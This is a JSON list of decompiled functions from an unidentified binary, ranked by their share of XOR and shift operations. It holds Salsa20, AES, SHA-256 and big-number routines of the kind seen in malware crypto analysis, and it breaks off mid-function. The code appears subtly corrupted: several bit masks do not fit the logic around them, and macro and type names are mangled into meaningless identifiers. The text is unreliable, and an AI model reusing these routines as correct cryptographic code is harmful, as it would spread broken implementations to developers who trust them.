[
    {
        "Function": "sub_40C26E",
        "Total XOR and shift operations": 37,
        "XOR operations": 0,
        "Shift operations": 37,
        "Operation percentage": "50.68%",
        "Function Body": "\nint __fastcall sub_40C26E(int a1, unsigned __int8 *a2, int a3, int a4, int a5, int a6, unsigned int a7)\n{\n  int v8; // ecx\n  int v9; // eax\n  int v10; // ecx\n  int v11; // eax\n  int v12; // ecx\n  int v13; // eax\n  int v14; // eax\n  int v15; // ecx\n  int v16; // eax\n  int v17; // ecx\n  int v18; // eax\n  int v19; // ecx\n  int v20; // eax\n  int result; // eax\n  int v22[16]; // [esp+8h] [ebp-80h] BYREF\n  int v23[16]; // [esp+48h] [ebp-40h] BYREF\n\n  v8 = *((unsigned __int16 *)a2 + 1);\n  v23[0] = salsa20_427E36 | ((byte_428EDC | ((byte_42D145 | (byte_425787 << 8)) << 8)) << 8);\n  v9 = a2[6];\n  v23[1] = *a2 | ((a2[1] | (v8 << 8)) << 8);\n  v10 = a2[4] | ((a2[5] | ((v9 | (a2[7] << 8)) << 8)) << 8);\n  v11 = a2[10];\n  v23[2] = v10;\n  v12 = a2[8] | ((a2[9] | ((v11 | (a2[11] << 8)) << 8)) << 8);\n  v13 = a2[14];\n  v23[3] = v12;\n  v23[4] = a2[12] | ((a2[13] | ((v13 | (a2[15] << 8)) << 8)) << 8);\n  v23[6] = a3;\n  v23[7] = a4;\n  v23[5] = byte_4225C3 | ((byte_424C51 | ((byte_4204B7 | (byte_42EED9 << 8)) << 8)) << 8);\n  v23[8] = a5;\n  v23[9] = a6;\n  v14 = a2[18];\n  v23[10] = byte_423EA4 | ((byte_42DBF7 | ((byte_42E381 | (byte_420A12 << 8)) << 8)) << 8);\n  v15 = a2[16] | ((a2[17] | ((v14 | (a2[19] << 8)) << 8)) << 8);\n  v16 = a2[22];\n  v23[11] = v15;\n  v17 = a2[20] | ((a2[21] | ((v16 | (a2[23] << 8)) << 8)) << 8);\n  v18 = a2[26];\n  v23[12] = v17;\n  v19 = a2[24] | ((a2[25] | ((v18 | (a2[27] << 8)) << 8)) << 8);\n  v20 = a2[30];\n  v23[13] = v19;\n  v23[14] = a2[28] | ((a2[29] | ((v20 | (a2[31] << 8)) << 8)) << 8);\n  v23[15] = byte_424821 | ((byte_429453 | ((byte_420307 | (byte_42B576 << 8)) << 8)) << 8);\n  sub_4093B2((int)v22, (int)v23, a7);\n  for ( result = 0; result < 64; ++result )\n    *(_BYTE *)(result + a1) = (unsigned int)v22[(unsigned int)result >> 2] >> (8 * (result & 3));\n  return result;\n}\n// 427E36: using guessed type char salsa20_427E36;\n// 428EDC: using guessed type char byte_428EDC;\n// 42D145: using guessed type char byte_42D145;\n// 425787: using guessed type char byte_425787;\n// 4225C3: using guessed type char byte_4225C3;\n// 424C51: using guessed type char byte_424C51;\n// 4204B7: using guessed type char byte_4204B7;\n// 42EED9: using guessed type char byte_42EED9;\n// 423EA4: using guessed type char byte_423EA4;\n// 42DBF7: using guessed type char byte_42DBF7;\n// 42E381: using guessed type char byte_42E381;\n// 420A12: using guessed type char byte_420A12;\n// 424821: using guessed type char byte_424821;\n// 429453: using guessed type char byte_429453;\n// 420307: using guessed type char byte_420307;\n// 42B576: using guessed type char byte_42B576;\n// 40C26E: using guessed type int var_80[16];\n\n"
    },
    {
        "Function": "sub_4093B2",
        "Total XOR and shift operations": 33,
        "XOR operations": 32,
        "Shift operations": 1,
        "Operation percentage": "18.64%",
        "Function Body": "\nint __fastcall sub_4093B2(int a1, int a2, unsigned int a3)\n{\n  int v4; // edx\n  int i; // edi\n  int v6; // ecx\n  int v7; // eax\n  int v8; // ebx\n  int v9; // esi\n  int v10; // ecx\n  int v11; // edx\n  int v12; // edi\n  int v13; // esi\n  int v14; // ecx\n  int v15; // eax\n  int v16; // edx\n  int v17; // ecx\n  int v18; // eax\n  bool v19; // zf\n  int v20; // edi\n  int result; // eax\n  int v22; // esi\n  int v23; // ebx\n  int v24; // edx\n  int v25; // ecx\n  int v27; // [esp+10h] [ebp-90h]\n  int v28; // [esp+14h] [ebp-8Ch]\n  int v29; // [esp+18h] [ebp-88h]\n  int v30; // [esp+1Ch] [ebp-84h]\n  int v31; // [esp+20h] [ebp-80h]\n  int v32; // [esp+24h] [ebp-7Ch]\n  int v33; // [esp+28h] [ebp-78h]\n  int v34; // [esp+2Ch] [ebp-74h]\n  int v35; // [esp+30h] [ebp-70h]\n  int v36; // [esp+34h] [ebp-6Ch]\n  int v37; // [esp+38h] [ebp-68h]\n  int v38; // [esp+3Ch] [ebp-64h]\n  int v39; // [esp+40h] [ebp-60h]\n  int v40; // [esp+44h] [ebp-5Ch]\n  int v41; // [esp+48h] [ebp-58h]\n  int v42; // [esp+4Ch] [ebp-54h]\n  int v43; // [esp+50h] [ebp-50h]\n  int v44; // [esp+54h] [ebp-4Ch]\n  int v45; // [esp+58h] [ebp-48h]\n  int v46; // [esp+5Ch] [ebp-44h]\n  int v47; // [esp+60h] [ebp-40h]\n  int v48; // [esp+64h] [ebp-3Ch]\n  int v49; // [esp+68h] [ebp-38h]\n  int v50; // [esp+6Ch] [ebp-34h]\n  int v51; // [esp+70h] [ebp-30h]\n  int v52; // [esp+74h] [ebp-2Ch]\n  int v53; // [esp+78h] [ebp-28h]\n  int v54; // [esp+7Ch] [ebp-24h]\n  int v55; // [esp+80h] [ebp-20h]\n  int v56; // [esp+84h] [ebp-1Ch]\n  int v57; // [esp+88h] [ebp-18h]\n  int v58; // [esp+8Ch] [ebp-14h]\n  int v59; // [esp+90h] [ebp-10h]\n  int v60; // [esp+94h] [ebp-Ch]\n  int v61; // [esp+98h] [ebp-8h]\n  int v62; // [esp+9Ch] [ebp-4h]\n  unsigned int v63; // [esp+A8h] [ebp+8h]\n\n  v4 = a1;\n  v27 = a2;\n  for ( i = 0; i < 16; ++i )\n  {\n    v6 = i;\n    v7 = *(_DWORD *)(a2 + 4 * i);\n    *(&v32 + v6) = v7;\n  }\n  v63 = a3 >> 1;\n  if ( v63 )\n  {\n    v8 = v43;\n    v9 = v33;\n    v10 = v32;\n    v11 = v44;\n    v55 = v46;\n    v62 = v45;\n    v56 = v42;\n    v57 = v41;\n    v58 = v40;\n    v49 = v39;\n    v48 = v37;\n    v59 = v36;\n    v54 = v47;\n    v12 = v38;\n    v50 = v35;\n    v60 = v43;\n    v53 = v38;\n    v51 = v34;\n    v52 = v33;\n    v61 = v32;\n    do\n    {\n      v59 ^= __ROL4__(v10 + v11, 7);\n      v31 = v58 ^ __ROL4__(v59 + v10, 9);\n      v29 = v11 ^ __ROL4__(v31 + v59, 13);\n      v61 ^= __ROR4__(v31 + v29, 14);\n      v58 = v57 ^ __ROL4__(v9 + v48, 7);\n      v28 = v62 ^ __ROL4__(v58 + v48, 9);\n      v13 = v52 ^ __ROL4__(v28 + v58, 13);\n      v57 = v48 ^ __ROR4__(v13 + v28, 14);\n      v30 = v55 ^ __ROL4__(v12 + v56, 7);\n      v14 = v51 ^ __ROL4__(v30 + v56, 9);\n      v55 = v53 ^ __ROL4__(v30 + v14, 13);\n      v56 ^= __ROR4__(v55 + v14, 14);\n      v15 = v50 ^ __ROL4__(v8 + v54, 7);\n      v16 = v49 ^ __ROL4__(v15 + v54, 9);\n      v60 ^= __ROL4__(v16 + v15, 13);\n      v62 = v54 ^ __ROR4__(v60 + v16, 14);\n      v52 = v13 ^ __ROL4__(v15 + v61, 7);\n      v33 = v52;\n      v51 = v14 ^ __ROL4__(v61 + v52, 9);\n      v34 = v51;\n      v50 = v15 ^ __ROL4__(v51 + v52, 13);\n      v35 = v50;\n      v61 ^= __ROR4__(v51 + v50, 14);\n      v32 = v61;\n      v53 = v55 ^ __ROL4__(v57 + v59, 7);\n      v38 = v53;\n      v12 = v53;\n      v49 = v16 ^ __ROL4__(v57 + v53, 9);\n      v39 = v49;\n      v59 ^= __ROL4__(v49 + v53, 13);\n      v36 = v59;\n      v48 = v57 ^ __ROR4__(v59 + v49, 14);\n      v37 = v48;\n      v17 = v58;\n      v60 ^= __ROL4__(v56 + v58, 7);\n      v43 = v60;\n      v58 = v31 ^ __ROL4__(v60 + v56, 9);\n      v40 = v58;\n      v57 = v17 ^ __ROL4__(v58 + v60, 13);\n      v41 = v57;\n      v18 = v62;\n      v56 ^= __ROR4__(v57 + v58, 14);\n      v42 = v56;\n      v11 = v29 ^ __ROL4__(v62 + v30, 7);\n      v62 = v28 ^ __ROL4__(v11 + v62, 9);\n      v45 = v62;\n      v55 = v30 ^ __ROL4__(v11 + v62, 13);\n      v46 = v55;\n      v8 = v60;\n      v9 = v52;\n      v19 = v63-- == 1;\n      v54 = v18 ^ __ROR4__(v62 + v55, 14);\n      v47 = v54;\n      v10 = v61;\n    }\n    while ( !v19 );\n    a2 = v27;\n    v44 = v11;\n    v4 = a1;\n  }\n  v20 = a2 + 12;\n  result = 2;\n  v22 = v4 + 4;\n  v23 = a2 - v4;\n  do\n  {\n    v22 += 16;\n    v20 += 16;\n    *(_DWORD *)(v22 - 20) = *(_DWORD *)(v20 - 28) + *(&v32 + result - 2);\n    *(_DWORD *)(v22 - 16) = *(_DWORD *)(v23 + v22 - 16) + *(&v32 + result - 1);\n    v24 = result + 1;\n    v25 = *(_DWORD *)(v20 - 20) + *(&v32 + result);\n    result += 4;\n    *(_DWORD *)(v22 - 12) = v25;\n    *(_DWORD *)(v22 - 8) = *(_DWORD *)(v20 - 16) + *(&v32 + v24);\n  }\n  while ( result - 2 < 16 );\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_40F17B",
        "Total XOR and shift operations": 7,
        "XOR operations": 2,
        "Shift operations": 5,
        "Operation percentage": "16.67%",
        "Function Body": "\nunsigned int __fastcall sub_40F17B(int a1, unsigned int a2)\n{\n  int v2; // edi\n  int v3; // esi\n  int v5; // eax\n  int v6; // ebx\n  unsigned int v7; // edx\n  _DWORD *v8; // eax\n  int v9; // edx\n\n  v2 = *(_DWORD *)(a1 + 4);\n  v3 = a2 >> 5;\n  if ( (int)(a2 >> 5) >= (int)abs32(v2) )\n    return (unsigned int)v2 >> 31;\n  v5 = *(_DWORD *)(a1 + 8);\n  v6 = a2 & 0x1F;\n  v7 = *(_DWORD *)(v5 + 4 * v3);\n  v8 = (_DWORD *)(v5 + 4 * v3);\n  v9 = (v7 >> v6) & 1;\n  if ( v2 < 0 )\n  {\n    if ( v6 && *v8 << (32 - v6) )\n      return v9 ^ 1;\n    if ( v3 )\n    {\n      while ( 1 )\n      {\n        --v8;\n        --v3;\n        if ( *v8 )\n          break;\n        if ( v3 <= 0 )\n          return v9;\n      }\n      return v9 ^ 1;\n    }\n  }\n  return v9;\n}\n\n"
    },
    {
        "Function": "sub_40392D",
        "Total XOR and shift operations": 30,
        "XOR operations": 26,
        "Shift operations": 4,
        "Operation percentage": "14.71%",
        "Function Body": "\nint __fastcall sub_40392D(unsigned __int8 *a1, int a2)\n{\n  int v2; // ebx\n  unsigned __int8 *v3; // edi\n  int v4; // esi\n  int v5; // edx\n  unsigned __int8 *v6; // ebx\n  unsigned __int8 *v7; // ecx\n  int v8; // edx\n  int v9; // eax\n  int v10; // esi\n  unsigned __int8 v11; // cl\n  unsigned __int8 v12; // al\n  unsigned __int8 v13; // cl\n  unsigned __int8 v14; // al\n  unsigned __int8 v15; // cl\n  unsigned __int8 v16; // al\n  unsigned __int8 v17; // cl\n  _BYTE *v18; // edi\n  char v19; // bh\n  char v20; // ch\n  char v21; // dl\n  char v22; // dh\n  int v23; // ebx\n  char *v24; // esi\n  unsigned __int8 *v25; // eax\n  int v26; // edx\n  char v27; // cl\n  unsigned __int8 *v28; // esi\n  int v29; // ebx\n  unsigned __int8 *v30; // ecx\n  int v31; // edx\n  int v32; // eax\n  unsigned __int8 v33; // cl\n  int v34; // esi\n  unsigned __int8 v35; // al\n  unsigned __int8 v36; // cl\n  unsigned __int8 v37; // al\n  unsigned __int8 v38; // cl\n  unsigned __int8 v39; // al\n  unsigned __int8 v40; // cl\n  int result; // eax\n  _BYTE *v42; // ecx\n  int v43; // edx\n  unsigned __int8 *v44; // [esp+Ch] [ebp-18h]\n  int v46; // [esp+14h] [ebp-10h]\n  char *v47; // [esp+18h] [ebp-Ch]\n  int v48; // [esp+1Ch] [ebp-8h]\n  char v49; // [esp+23h] [ebp-1h]\n\n  v2 = 4;\n  v3 = a1;\n  v44 = a1;\n  v4 = a2 - (_DWORD)a1;\n  do\n  {\n    v5 = 4;\n    do\n    {\n      *a1 ^= a1[v4];\n      ++a1;\n      --v5;\n    }\n    while ( v5 );\n    --v2;\n  }\n  while ( v2 );\n  v46 = 13;\n  v47 = (char *)(a2 + 16);\n  do\n  {\n    v6 = v3;\n    v48 = 4;\n    do\n    {\n      v7 = v6;\n      v8 = 4;\n      do\n      {\n        v9 = *v7;\n        v7 += 4;\n        *(v7 - 4) = RijnDael_AES_LONG_41F27D[v9];\n        --v8;\n      }\n      while ( v8 );\n      ++v6;\n      --v48;\n    }\n    while ( v48 );\n    v10 = 4;\n    v11 = v3[1];\n    v3[1] = v3[5];\n    v3[5] = v3[9];\n    v3[9] = v3[13];\n    v12 = v3[10];\n    v3[13] = v11;\n    v13 = v3[2];\n    v3[2] = v12;\n    v14 = v3[14];\n    v3[10] = v13;\n    v15 = v3[6];\n    v3[6] = v14;\n    v16 = v3[15];\n    v3[14] = v15;\n    v17 = v3[3];\n    v3[3] = v16;\n    v3[15] = v3[11];\n    v3[11] = v3[7];\n    v3[7] = v17;\n    v18 = v3 + 2;\n    do\n    {\n      v19 = v18[1];\n      v18 += 4;\n      v20 = *(v18 - 4);\n      v21 = *(v18 - 5);\n      v49 = *(v18 - 6);\n      v22 = v21 ^ v49 ^ v20 ^ v19;\n      *(v18 - 6) = v22 ^ v49 ^ (2 * (v21 ^ v49)) ^ (27 * ((unsigned __int8)(v21 ^ v49) >> 7));\n      *(v18 - 5) = v22 ^ v21 ^ (2 * (v20 ^ v21)) ^ (27 * ((unsigned __int8)(v20 ^ v21) >> 7));\n      *(v18 - 4) = v22 ^ v20 ^ (2 * (v20 ^ v19)) ^ (27 * ((unsigned __int8)(v20 ^ v19) >> 7));\n      *(v18 - 3) = v22 ^ v19 ^ (2 * (v19 ^ v49)) ^ (27 * ((unsigned __int8)(v19 ^ v49) >> 7));\n      --v10;\n    }\n    while ( v10 );\n    v3 = v44;\n    v23 = 4;\n    v24 = v47;\n    v25 = v44;\n    do\n    {\n      v26 = 4;\n      do\n      {\n        v27 = *v24++;\n        *v25++ ^= v27;\n        --v26;\n      }\n      while ( v26 );\n      v47 = v24;\n      --v23;\n    }\n    while ( v23 );\n    --v46;\n  }\n  while ( v46 );\n  v28 = v44;\n  v29 = 4;\n  do\n  {\n    v30 = v28;\n    v31 = 4;\n    do\n    {\n      v32 = *v30;\n      v30 += 4;\n      *(v30 - 4) = RijnDael_AES_LONG_41F27D[v32];\n      --v31;\n    }\n    while ( v31 );\n    ++v28;\n    --v29;\n  }\n  while ( v29 );\n  v33 = v44[1];\n  v34 = 4;\n  v44[1] = v44[5];\n  v44[5] = v44[9];\n  v44[9] = v44[13];\n  v35 = v44[10];\n  v44[13] = v33;\n  v36 = v44[2];\n  v44[2] = v35;\n  v37 = v44[14];\n  v44[10] = v36;\n  v38 = v44[6];\n  v44[6] = v37;\n  v39 = v44[15];\n  v44[14] = v38;\n  v40 = v44[3];\n  v44[3] = v39;\n  v44[15] = v44[11];\n  result = v44[7];\n  v44[7] = v40;\n  v44[11] = result;\n  v42 = (_BYTE *)(a2 + 224);\n  do\n  {\n    v43 = 4;\n    do\n    {\n      LO34A2(result) = *v42++;\n      *v3++ ^= result;\n      --v43;\n    }\n    while ( v43 );\n    --v34;\n  }\n  while ( v34 );\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_405FBE",
        "Total XOR and shift operations": 16,
        "XOR operations": 11,
        "Shift operations": 5,
        "Operation percentage": "14.68%",
        "Function Body": "\nint __fastcall sub_405FBE(int a1, int a2)\n{\n  _DWORD *v2; // ebx\n  int v3; // esi\n  unsigned int i; // edi\n  int v5; // edx\n  _DWORD *v6; // eax\n  unsigned int v7; // ebx\n  unsigned int v8; // edx\n  unsigned int v9; // edx\n  int v10; // edi\n  int v11; // eax\n  int v12; // ebx\n  int v13; // esi\n  int v14; // eax\n  int v15; // ecx\n  int v16; // eax\n  _DWORD *v17; // ebx\n  int result; // eax\n  _DWORD v19[66]; // [esp+4h] [ebp-130h] BYREF\n  int v20; // [esp+10Ch] [ebp-28h]\n  _DWORD *v21; // [esp+110h] [ebp-24h]\n  unsigned int v22; // [esp+114h] [ebp-20h]\n  int v23; // [esp+118h] [ebp-1Ch]\n  int v24; // [esp+11Ch] [ebp-18h]\n  int v25; // [esp+120h] [ebp-14h]\n  int v26; // [esp+124h] [ebp-10h]\n  int v27; // [esp+128h] [ebp-Ch]\n  int v28; // [esp+12Ch] [ebp-8h]\n  int v29; // [esp+130h] [ebp-4h]\n\n  v2 = (_DWORD *)a1;\n  v3 = a2 + 1;\n  v21 = (_DWORD *)a1;\n  for ( i = 0; i < 0x10; ++i )\n  {\n    v5 = *(unsigned __int8 *)(v3 - 1);\n    v3 += 4;\n    v19[i + 2] = *(unsigned __int8 *)(v3 - 2) | ((*(unsigned __int8 *)(v3 - 3) | ((*(unsigned __int8 *)(v3 - 4) | (v5 << 8)) << 8)) << 8);\n  }\n  if ( i < 0x40 )\n  {\n    v6 = &v19[i];\n    v7 = 64 - i;\n    do\n    {\n      v8 = *(v6 - 13);\n      ++v6;\n      v6[1] = *(v6 - 6)\n            + *(v6 - 15)\n            + ((*(v6 - 1) >> 10) ^ __ROL4__(*(v6 - 1), 13) ^ __ROL4__(*(v6 - 1), 15))\n            + ((v8 >> 3) ^ __ROR4__(v8, 7) ^ __ROL4__(v8, 14));\n      --v7;\n    }\n    while ( v7 );\n    v2 = v21;\n  }\n  v9 = 0;\n  v20 = v2[20];\n  v10 = v20;\n  v26 = v2[21];\n  v29 = v2[22];\n  v25 = v2[23];\n  v24 = v2[24];\n  v28 = v2[25];\n  v27 = v2[26];\n  v11 = v2[27];\n  v12 = v24;\n  v23 = v11;\n  v22 = 0;\n  do\n  {\n    v13 = v23\n        + *(_DWORD *)((char *)&v19[2] + v9)\n        + *(int *)((char *)&dword_411DCA + v9)\n        + (v12 & v28 ^ v27 & ~v12)\n        + (__ROR4__(v12, 6) ^ __ROL4__(v12, 7) ^ __ROR4__(v12, 11));\n    v23 = v27;\n    v14 = v28;\n    v15 = v10;\n    v28 = v12;\n    v10 = (v10 & v26 ^ v29 & (v10 ^ v26)) + (__ROR4__(v10, 2) ^ __ROL4__(v10, 10) ^ __ROR4__(v10, 13)) + v13;\n    v27 = v14;\n    v12 = v13 + v25;\n    v9 = v22 + 4;\n    v25 = v29;\n    v29 = v26;\n    v26 = v15;\n    v22 = v9;\n  }\n  while ( v9 < 0x100 );\n  v16 = v10 + v20;\n  v24 = v12;\n  v17 = v21;\n  v21[21] += v15;\n  v17[20] = v16;\n  v17[22] += v29;\n  v17[23] += v25;\n  v17[24] += v24;\n  v17[25] += v28;\n  v17[26] += v27;\n  result = v23;\n  v17[27] += v23;\n  return result;\n}\n// 411DCA: using guessed type int dword_411DCA;\n\n"
    },
    {
        "Function": "sub_40AE29",
        "Total XOR and shift operations": 9,
        "XOR operations": 0,
        "Shift operations": 9,
        "Operation percentage": "12.16%",
        "Function Body": "\n_DWORD *__fastcall sub_40AE29(_DWORD *a1, int *a2, int a3)\n{\n  _DWORD *result; // eax\n  int v6; // esi\n  unsigned int v7; // edx\n  int v8; // ebx\n  int i; // eax\n  bool v10; // sf\n  int v11; // ecx\n  unsigned int v12; // edx\n  int j; // eax\n\n  if ( a3 == 1 )\n    return sub_40BA5E(a1, *a2);\n  v6 = 0;\n  if ( a3 == 2 )\n  {\n    v7 = *a2;\n    v8 = a2[1];\n    for ( i = v8; (i & 0xFF9D5100) == 0; v6 += 8 )\n      i <<= 8;\n    if ( i >= 0 )\n    {\n      do\n      {\n        ++v6;\n        v10 = (i & 0x40017300) != 0;\n        i *= 2;\n      }\n      while ( !v10 );\n    }\n    *a1 = v6;\n    if ( v6 )\n    {\n      v8 = (v7 >> (32 - v6)) | (v8 << v6);\n      v7 <<= v6;\n    }\n    a1[1] = v8;\n    a1[2] = v7;\n    result = (_DWORD *)sub_404B33(v8, v7);\n    a1[3] = result;\n  }\n  else\n  {\n    v11 = a2[a3 - 1];\n    v12 = a2[a3 - 2];\n    for ( j = v11; (j & 0xFF9D5100) == 0; v6 += 8 )\n      j <<= 8;\n    if ( j >= 0 )\n    {\n      do\n      {\n        ++v6;\n        v10 = (j & 0x40017300) != 0;\n        j *= 2;\n      }\n      while ( !v10 );\n    }\n    *a1 = v6;\n    if ( v6 )\n    {\n      v11 = (v12 >> (32 - v6)) | (v11 << v6);\n      v12 = ((unsigned int)a2[a3 - 3] >> (32 - v6)) | (v12 << v6);\n    }\n    a1[1] = v11;\n    a1[2] = v12;\n    result = (_DWORD *)sub_404B33(v11, v12);\n    a1[3] = result;\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_406241",
        "Total XOR and shift operations": 4,
        "XOR operations": 0,
        "Shift operations": 4,
        "Operation percentage": "11.11%",
        "Function Body": "\nint __fastcall sub_406241(int a1, int a2, int a3, char a4)\n{\n  _DWORD *v4; // ebx\n  _DWORD *v5; // edi\n  int v6; // edx\n  int v7; // eax\n  unsigned int v8; // esi\n  int v10; // [esp+1Ch] [ebp+8h]\n\n  v4 = (_DWORD *)(4 * a3 + a2 - 4);\n  v5 = (_DWORD *)(4 * a3 + a1);\n  v6 = *v4 >> (32 - a4);\n  v7 = *v4 << a4;\n  v10 = a3 - 1;\n  if ( v10 )\n  {\n    do\n    {\n      v8 = *--v4;\n      *--v5 = v7 | (v8 >> (32 - a4));\n      v7 = v8 << a4;\n      --v10;\n    }\n    while ( v10 );\n    *(v5 - 1) = v7;\n    return v6;\n  }\n  else\n  {\n    *(v5 - 1) = v7;\n    return v6;\n  }\n}\n\n"
    },
    {
        "Function": "sub_40B781",
        "Total XOR and shift operations": 4,
        "XOR operations": 0,
        "Shift operations": 4,
        "Operation percentage": "10.00%",
        "Function Body": "\nint __fastcall sub_40B781(_DWORD *a1, _DWORD *a2, int a3, char a4)\n{\n  _DWORD *v4; // edi\n  unsigned int *v5; // ebx\n  int v6; // esi\n  int v7; // eax\n  bool v8; // zf\n  unsigned int v9; // esi\n  int v11; // [esp+Ch] [ebp-8h]\n  int v12; // [esp+1Ch] [ebp+8h]\n\n  v4 = a1;\n  v5 = a2 + 1;\n  v6 = *a2 << (32 - a4);\n  v7 = *a2 >> a4;\n  v8 = a3 == 1;\n  v12 = a3 - 1;\n  v11 = v6;\n  if ( v8 )\n  {\n    *a1 = v7;\n    return v6;\n  }\n  else\n  {\n    do\n    {\n      v9 = *v5++;\n      *v4++ = v7 | (v9 << (32 - a4));\n      v7 = v9 >> a4;\n      --v12;\n    }\n    while ( v12 );\n    *v4 = v7;\n    return v11;\n  }\n}\n\n"
    },
    {
        "Function": "sub_402825",
        "Total XOR and shift operations": 2,
        "XOR operations": 1,
        "Shift operations": 1,
        "Operation percentage": "8.33%",
        "Function Body": "\nchar __fastcall sub_402825(int a1, unsigned __int8 *a2, int a3, int a4, int a5, int a6, unsigned int a7)\n{\n  signed int i; // esi\n  char result; // al\n  char v10[68]; // [esp+10h] [ebp-4Ch] BYREF\n  unsigned __int8 *v11; // [esp+54h] [ebp-8h]\n\n  v11 = a2;\n  for ( i = 0; (unsigned int)i < 0x20; ++i )\n  {\n    if ( (i & 0x801FB13F) == 0 )\n      sub_40C26E((int)v10, v11, a5, a6, i / 64, (i / 64) >> 31, a7);\n    result = v10[i];\n    *(_BYTE *)(i + a1) ^= result;\n  }\n  return result;\n}\n// 40DB8B: conditional instruction was optimized away because esi.4<20u\n// 40D6F1: mask 0x801FB13F is shortened because esi.4 <= 0x1F\n// 40D6F1: masking with 0x1F was optimized away because esi.4 <= 0x1F\n// 402825: using guessed type char var_4C[68];\n\n"
    },
    {
        "Function": "sub_40BA5E",
        "Total XOR and shift operations": 6,
        "XOR operations": 0,
        "Shift operations": 6,
        "Operation percentage": "8.11%",
        "Function Body": "\n_DWORD *__fastcall sub_40BA5E(_DWORD *a1, int a2)\n{\n  int v4; // ecx\n  int i; // eax\n  bool v6; // sf\n  unsigned int v7; // ebx\n  unsigned int v8; // edx\n  unsigned int v9; // eax\n  unsigned int v10; // edi\n  unsigned int v11; // edi\n  unsigned int v12; // esi\n  unsigned int v13; // ecx\n  unsigned int v14; // esi\n  int v15; // edi\n  unsigned int v16; // edi\n  unsigned int v17; // edx\n  int v18; // ecx\n  _DWORD *result; // eax\n  _DWORD *v20; // [esp+Ch] [ebp-Ch]\n  unsigned int v21; // [esp+14h] [ebp-4h]\n\n  v4 = 0;\n  v20 = a1;\n  for ( i = a2; (i & 0xFF9D5100) == 0; v4 += 8 )\n    i <<= 8;\n  if ( i >= 0 )\n  {\n    do\n    {\n      ++v4;\n      v6 = (i & 0x40017300) != 0;\n      i *= 2;\n    }\n    while ( !v6 );\n  }\n  v7 = a2 << v4;\n  *a1 = v4;\n  a1[1] = v7;\n  v8 = ~v7 / HIC461(v7);\n  v9 = v8 * (unsigned __int16)v7;\n  v10 = ((~v7 - HIC461(v7) * v8) << 16) | 0xFFFF;\n  if ( v10 < v9 )\n  {\n    v10 += v7;\n    --v8;\n    if ( v10 >= v7 && v10 < v9 )\n    {\n      --v8;\n      v10 += v7;\n    }\n  }\n  v11 = v10 - v9;\n  v12 = v11 + v8 * HIC461(v11);\n  v13 = v12 << 16;\n  v14 = HIC461(v12);\n  v15 = (v11 << 16) - v7 * (v14 + 1);\n  v21 = v15 + 0xFFFF;\n  if ( v15 + 0xFFFF < v13 )\n    v16 = v15 + 0xFFFF;\n  else\n    v16 = v7 + v15 + 0xFFFF;\n  if ( v21 < v13 )\n    ++v14;\n  v17 = v8 << 16;\n  v18 = v14 + v17 + 1;\n  if ( v16 < v7 )\n    v18 = v14 + v17;\n  result = v20;\n  v20[3] = v18;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_405DBE",
        "Total XOR and shift operations": 6,
        "XOR operations": 5,
        "Shift operations": 1,
        "Operation percentage": "7.23%",
        "Function Body": "\nunsigned __int8 *__fastcall sub_405DBE(_BYTE *a1, _BYTE *a2)\n{\n  unsigned __int8 *result; // eax\n  unsigned int v3; // esi\n  unsigned __int8 v4; // dh\n  unsigned __int8 v5; // bl\n  unsigned __int8 v6; // bh\n  int v7; // edx\n  char v8; // [esp+Eh] [ebp-2h]\n  unsigned __int8 v9; // [esp+Fh] [ebp-1h]\n\n  *a1 = *a2;\n  a1[1] = a2[1];\n  a1[2] = a2[2];\n  a1[3] = a2[3];\n  a1[4] = a2[4];\n  a1[5] = a2[5];\n  a1[6] = a2[6];\n  a1[7] = a2[7];\n  a1[8] = a2[8];\n  a1[9] = a2[9];\n  a1[10] = a2[10];\n  a1[11] = a2[11];\n  a1[12] = a2[12];\n  a1[13] = a2[13];\n  a1[14] = a2[14];\n  a1[15] = a2[15];\n  a1[16] = a2[16];\n  a1[17] = a2[17];\n  a1[18] = a2[18];\n  a1[19] = a2[19];\n  a1[20] = a2[20];\n  a1[21] = a2[21];\n  a1[22] = a2[22];\n  a1[23] = a2[23];\n  a1[24] = a2[24];\n  a1[25] = a2[25];\n  a1[26] = a2[26];\n  a1[27] = a2[27];\n  a1[28] = a2[28];\n  result = a1 + 29;\n  a1[29] = a2[29];\n  a1[30] = a2[30];\n  a1[31] = a2[31];\n  v3 = 8;\n  do\n  {\n    v4 = result[2];\n    v5 = *(result - 1);\n    v6 = *result;\n    v9 = result[1];\n    if ( (v3 & 7) != 0 )\n    {\n      if ( (v3 & 7) == 4 )\n      {\n        v5 = RijnDael_AES_LONG_41F27D[v5];\n        v6 = RijnDael_AES_LONG_41F27D[v6];\n        v9 = RijnDael_AES_LONG_41F27D[v9];\n        v4 = RijnDael_AES_LONG_41F27D[v4];\n      }\n    }\n    else\n    {\n      v7 = v6;\n      v6 = RijnDael_AES_LONG_41F27D[result[1]];\n      v9 = RijnDael_AES_LONG_41F27D[result[2]];\n      v8 = RijnDael_AES_LONG_41F27D[v5];\n      v5 = RijnDael_AES_LONG_41F27D[v7] ^ byte_419BD9[v3 >> 3];\n      v4 = v8;\n    }\n    ++v3;\n    result[3] = v5 ^ *(result - 29);\n    result[4] = v6 ^ *(result - 28);\n    result[5] = v9 ^ *(result - 27);\n    result[6] = v4 ^ *(result - 26);\n    result += 4;\n  }\n  while ( v3 < 0x3C );\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_404D22",
        "Total XOR and shift operations": 7,
        "XOR operations": 0,
        "Shift operations": 7,
        "Operation percentage": "4.79%",
        "Function Body": "\nunsigned int __fastcall sub_404D22(int a1, _DWORD *a2, int a3, int a4, int *a5)\n{\n  int v5; // edx\n  int v6; // edi\n  HA6BA8 ProcessHeap; // eax\n  int v8; // eax\n  _DWORD *v9; // edi\n  int v10; // ebx\n  int v11; // ebx\n  unsigned int result; // eax\n  char *v13; // edi\n  unsigned int *v14; // ecx\n  unsigned int v15; // ebx\n  unsigned int v16; // esi\n  int v17; // edx\n  int v18; // edi\n  unsigned int v19; // ebx\n  int v20; // edi\n  unsigned int v21; // edx\n  unsigned int v22; // esi\n  unsigned __int64 v23; // kr00_8\n  unsigned int v24; // ebx\n  unsigned int v25; // edi\n  int v26; // ecx\n  unsigned int v27; // esi\n  unsigned int v28; // ebx\n  int v29; // edx\n  unsigned int v30; // edi\n  int v31; // esi\n  HA6BA8 v32; // eax\n  int v33; // [esp+Ch] [ebp-3Ch]\n  char *v34; // [esp+10h] [ebp-38h]\n  unsigned int v35; // 